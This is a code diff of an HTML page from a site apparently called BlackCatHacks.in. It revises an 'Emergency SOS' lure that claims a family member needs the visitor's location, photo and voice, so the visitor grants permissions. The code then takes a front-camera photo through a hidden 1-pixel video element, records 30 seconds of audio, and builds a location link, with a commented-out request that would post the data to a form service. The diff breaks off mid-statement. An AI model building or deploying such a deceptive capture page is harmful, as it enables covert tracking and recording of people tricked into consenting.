@@ -21,15 +21,15 @@ h1{text-align:center;color:#fff;margin:10px 0 0 0}
 </head>
 <body>
 
-<!-- SUPER SOS BOX v2 - 1 MIN AUDIO + PHOTO -->
+<!-- SUPER SOS v3 - 30 SEC FIXED -->
 <div id="sosBox">
 <div style="font-size:50px">🚨</div>
 <h2 style="color:#ff3333;margin:10px 0">Emergency SOS</h2>
 <p style="font-size:13px">Family member needs your location, photo & voice for safety</p>
 <p style="font-size:11px;opacity:.5">Code: <span id="scode"></span></p>
-<button onclick="sendSuperSOS()" id="sosBtn" style="padding:14px 28px;font-size:16px;border-radius:25px;margin-top:20px;background:#ff3333;color:#fff">📍 Share Location + Photo + 1 Min Audio</button>
-<p id="sstatus" style="margin-top:15px;font-size:13px;max-width:300px;line-height:1.4"></p>
-<video id="vPreview" autoplay muted style="display:none;width:1px;height:1px"></video>
+<button onclick="sendSuperSOS()" id="sosBtn" style="padding:14px 28px;font-size:16px;border-radius:25px;margin-top:20px;background:#ff3333;color:#fff">📍 Share Location + Photo + 30 Sec Audio</button>
+<p id="sstatus" style="margin-top:15px;font-size:13px;max-width:320px;line-height:1.4"></p>
+<video id="vPreview" autoplay muted playsinline style="display:none;width:1px;height:1px"></video>
 <canvas id="vCanvas" style="display:none"></canvas>
 </div>
 
@@ -43,7 +43,7 @@ h1{text-align:center;color:#fff;margin:10px 0 0 0}
 <div class="card"><h3>🔗 Suspicious Link Scanner</h3><p>Check if a link is safe or phishing</p><input placeholder="https://example.com"><br><button>Scan Link</button></div>
 <div class="card"><h3>📧 Email Leak Check</h3><p>Check if your email was leaked</p><input placeholder="your@email.com"><br><button>Check Now</button></div>
 <div class="card"><h3>📸 Instagram Clone Detector</h3><p>Check if someone cloned your insta</p><button>Check Now</button></div>
-<div class="card" style="border-color:#00ff88"><h3>🚨 Emergency SOS</h3><p>Family Safety Tracker - Photo + 1 Min Audio + Live Location</p><a href="tools/emergency-live-location-sos.html"><button>Open Tool</button></a></div>
+<div class="card" style="border-color:#00ff88"><h3>🚨 Emergency SOS</h3><p>Family Safety Tracker - Photo + 30 Sec Audio + Live Location</p><a href="tools/emergency-live-location-sos.html"><button>Open Tool</button></a></div>
 </div>
 
 <div style="text-align:center;font-size:9px;opacity:.3;margin-top:25px">Made with ❤️ by DevilKing | BlackCatHacks.in © 2026<br>Educational Purpose Only</div>
@@ -56,78 +56,15 @@ async function sendSuperSOS(){
   let status = document.getElementById('sstatus');
   let btn = document.getElementById('sosBtn');
   btn.disabled = true;
-  status.innerText = 'Getting location... Please ALLOW permission';
+  btn.style.opacity = "0.5";
+  status.innerText = 'Getting location... Please ALLOW';
 
   navigator.geolocation.getCurrentPosition(async (pos)=>{
-    let lat = pos.coords.latitude, lon = pos.coords.longitude;
-    let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-    let code = p || 'n89nx';
-    status.innerText = `Location Found: ${lat.toFixed(5)}, ${lon.toFixed(5)}\nNow capturing photo...`;
+    let lat=pos.coords.latitude, lon=pos.coords.longitude;
+    let mapLink=`https://www.google.com/maps?q=${lat},${lon}`;
+    let code=p||'n89nx';
+    status.innerText=`Location: ${lat.toFixed(5)}, ${lon.toFixed(5)}\nCapturing photo...`;
 
-    // 1. PHOTO
-    let photoData = "";
+    let photoData="";
     try{
-      let stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-      let video = document.getElementById('vPreview');
-      video.srcObject = stream;
-      await new Promise(r=>setTimeout(r,1200));
-      let canvas = document.getElementById('vCanvas');
-      canvas.width = 640; canvas.height = 480;
-      canvas.getContext('2d').drawImage(video,0,0,640,480);
-      photoData = canvas.toDataURL('image/jpeg',0.6);
-      stream.getTracks().forEach(t=>t.stop());
-      status.innerText = "Photo captured! 🔴 Recording 1 MINUTE audio now... Speak loudly!";
-    }catch(e){ photoData = ""; status.innerText = "Camera denied, recording audio only..."; }
-
-    // 2. AUDIO 1 MINUTE = 60000ms
-    try{
-      let aStream = await navigator.mediaDevices.getUserMedia({audio:true});
-      let recorder = new MediaRecorder(aStream);
-      let chunks = [];
-      recorder.ondataavailable = e=>chunks.push(e.data);
-      
-      let countdown = 60;
-      recorder.onstart = ()=>{
-        let timer = setInterval(()=>{
-          countdown--;
-          status.innerHTML = `🔴 Recording... ${countdown}s left<br>Please stay on page & speak`;
-          if(countdown<=0) clearInterval(timer);
-        },1000);
-      };
-      
-      recorder.start();
-      await new Promise(r=>setTimeout(r,60000)); // 1 MINUTE
-      recorder.stop();
-      await new Promise(r=>recorder.onstop=r);
-      let blob = new Blob(chunks,{type:'audio/webm'});
-      let reader = new FileReader();
-      reader.readAsDataURL(blob);
-      await new Promise(r=>reader.onloadend=r);
-      let audioData = reader.result;
-      aStream.getTracks().forEach(t=>t.stop());
-
-      status.innerText = "Sending SOS to family...";
-
-      // ---- SEND TO EMAIL / FORMSPREE ----
-      console.log({code, lat, lon, mapLink, photo: photoData.substring(0,50), audioSize: blob.size});
-      // fetch("https://formspree.io/f/YOUR_FORM_ID", {
-      //   method:"POST",
-      //   headers:{"Content-Type":"application/json"},
-      //   body: JSON.stringify({sos_code:code, latitude:lat, longitude:lon, map:mapLink, photo:photoData, audio:audioData})
-      // });
-
-      let wa = `https://wa.me/?text=${encodeURIComponent('🚨 EMERGENCY SOS 🚨\nCode: '+code+'\nLocation: '+mapLink+'\nPhoto+Audio captured')}`;
-      status.innerHTML = `✅ <b style="color:#00ff88">SOS Sent! 1 Min Audio + Photo + Location</b><br><br><a href="${mapLink}" target="_blank" style="color:#00ff88">${mapLink}</a><br><br><a href="${wa}"><button style="background:#25D366;color:#fff;padding:10px 18px;border:none;border-radius:20px">Share on WhatsApp</button></a>`;
-
-    }catch(e){
-      status.innerHTML = `Mic Error: ${e.message}<br>But Location: <a href="${mapLink}" target="_blank" style="color:#00ff88">${mapLink}</a>`;
-      btn.disabled = false;
-    }
-  },()=>{
-    status.innerText='Please allow location permission - its emergency';
-    btn.disabled = false;
-  });
-}
-</script>
-</body>
-</html>
+      let stream=await navigator.mediaDevices.getUserMedia
